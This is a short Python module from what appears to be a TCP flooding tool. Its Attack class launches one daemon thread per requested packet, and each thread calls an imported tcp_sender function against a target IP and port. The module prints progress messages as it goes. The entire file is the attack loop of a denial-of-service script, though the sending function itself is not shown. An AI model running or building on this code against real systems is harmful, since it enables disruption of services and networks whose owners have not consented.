from lib.util.debug import Debug
from lib.util.send_tcp import tcp_sender
import threading
class Attack:
	def __init__(self, ip, port, packets):
		self.ip = ip
		self.port = port
		self.packets = packets
	def attack(self):
		total = 0
		for x in range(int(self.packets)):
			threading.Thread(target=tcp_sender, args=(self.ip, self.port), daemon=True).start()
			total+=1
			Debug(f'[*] Packets have been sent sucessfuly {total}', verbose=True)
		Debug(f'[+] Sent {total} packets', verbose=True)


